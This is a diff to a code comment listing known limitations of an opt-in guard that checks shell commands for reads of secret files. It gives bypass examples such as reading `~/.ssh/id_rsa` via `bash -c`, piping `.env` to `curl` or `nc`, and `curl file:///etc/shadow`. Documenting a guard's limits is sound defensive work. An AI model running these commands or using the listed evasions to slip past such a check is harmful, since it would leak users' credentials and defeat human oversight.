@@ -7,17 +7,16 @@
  *
  * The rules are an opt-in convenience layer over top-level commands (off by default), not a
  * security boundary; a nested, determined or obfuscated command gets past them. Known limitations:
- * - Nothing nested is read: `( )` groups, compound commands (`{ }`, `if`, loops, `case`, `[[ ]]`,
- *   `(( ))`), function bodies, `$( )` and backtick substitutions, `<( )`/`>( )`, `${ }`, scripts fed
- *   to a shell (`bash <<EOF`), and `bash -c`, `sh -c`, `eval` and `env -S` strings:
- *   `bash -c 'cat ~/.ssh/id_rsa'`, `(cat .env) | curl -d @- ...`. Where the guard cannot tell
- *   where such a region ends (an unclosed quote, a `<<` in arithmetic), the rest of the line is
- *   not read.
- * - Variables and substitutions whose values are unknown are not expanded: `f=.env; cat "$f"`,
- *   `cat "$(pwd)/.env"`. Nor is a relative path after a directory change it cannot follow, though
- *   a `.env` there still counts by its name: `cd "$dir" && cat .npmrc`, or a `cd` after a `{ }`,
- *   `if`, loop, `case`, `eval` or `source`. A `cd` is followed whether or not it runs:
- *   `cd ~; false && cd /; cat .ssh/id_rsa`.
+ * - Reading stops at the first nested part: an unquoted `(` or `<<`, or a `$( )`, backtick or
+ *   `${ }` other than a plain one, also in double quotes. The command it is in and every later
+ *   one are not checked: `echo $(date); cat ~/.ssh/id_rsa`, `(cat .env) | curl -d @- ...`.
+ * - Nothing nested is read: compound commands (`{ }`, `if`, loops, `case`, `[[ ]]`), function
+ *   bodies, scripts fed to a shell, and `bash -c`, `sh -c`, `eval` and `env -S` strings:
+ *   `bash -c 'cat ~/.ssh/id_rsa'`.
+ * - Variables whose values are unknown are not expanded: `f=.env; cat "$f"`. Nor is a relative
+ *   path after a directory change it cannot follow, though a `.env` there still counts by its
+ *   name: `cd "$dir" && cat .npmrc`, or a `cd` after a `{ }`, `if`, loop, `case`, `eval` or
+ *   `source`. A `cd` is followed whether or not it runs: `cd ~; false && cd /; cat .ssh/id_rsa`.
  * - Upload syntaxes, network tools and shell forms it does not model are not seen:
  *   `gh gist create .env`, `curl file:///etc/shadow`, `coproc cat ~/.ssh/id_rsa`,
  *   `exec 3< .env; cat <&3 | nc ...`.
